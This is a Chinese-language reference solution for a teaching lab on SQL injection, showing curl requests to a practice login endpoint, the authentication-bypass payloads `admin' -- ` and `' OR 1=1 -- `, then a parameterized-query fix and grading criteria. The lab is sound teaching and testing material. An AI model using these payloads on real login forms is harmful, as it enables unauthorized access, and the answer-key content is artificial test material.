# SQL 注入与参数化查询 · 参考解答

## 目标与实现边界

这是 A05 教学靶机的 **POST /login**，使用 SQLite；每次登录请求创建一条 admin 记录并设置随机密码。用户名与密码被拼入 SQL，攻击面是查询结构，不是弱口令。不要混用“SQL 注入基础实验”的 GET 登录接口。

## 复现步骤

先在浏览器按正常方式提交 `admin` / `wrong`。也可在 Kali 执行：

```bash
TARGET='http://TARGET_IP:8000'
curl -sS -i "$TARGET/login" --data-urlencode 'username=admin' --data-urlencode 'password=wrong'
```

预期 HTTP 403 和“登录失败”。接着提交单个引号作为用户名，预期 HTTP 400 和 SQL 语法反馈：

```bash
curl -sS -i "$TARGET/login" --data-urlencode "username='" --data-urlencode 'password=wrong'
```

最后填入 `admin' -- `，密码仍为 `wrong`：

```bash
curl -sS -i "$TARGET/login" --data-urlencode "username=admin' -- " --data-urlencode 'password=wrong'
```

预期 HTTP 200，正文出现本次 Flag。引号结束用户名字符串，注释截断密码条件，使查询仅按 admin 匹配。取得页面中的值后提交到平台，并记录三种请求的区别。

```sql
SELECT username FROM users WHERE username = 'admin' -- ' AND password = 'wrong'
```

## 常见失败与解释

直接在地址栏访问 `/login` 是 GET，不是本场景要求的 POST。`curl --data-urlencode` 会正确编码引号与空格并发送 POST；不要加 `--get`。使用 `-f` 可能在 400/403 时隐藏你需要分析的响应正文，示例因此只用 `-sS -i`。

`admin ' --` 在引号前多一个空格会改变用户名；`admin '' --` 也不等于正确闭合字符串。语法错误只能证明异常输入影响了查询，不能视为拿到 Flag。允许 `' OR 1=1 -- ` 等能解释相同根因的等价输入。

## 修复思路与回归

改用值参数绑定，例如：

```python
db.execute('SELECT username FROM users WHERE username = ? AND password = ?',
           (username, password)).fetchone()
```

生产认证还需使用口令哈希验证和最小数据库权限。参数绑定分离结构和值，不依赖手工替换引号；动态列名、排序方向等不能当成值参数的部分使用固定允许列表。

修复回归：正常凭据成功；错误凭据失败；含引号及上述布尔/注释输入作为普通值处理并失败；响应不泄露数据库内部错误。

## 本实验评估要点

核实 POST 方法、失败/错误/成功三类行为中的实际证据，及引号、注释对 WHERE 子句的影响。不是必须先触发语法错误才能通过原理评估；若已有清晰的正常与绕过结果对照，同样有效。只有请求或跳转记录时，不推断服务端认证结果。
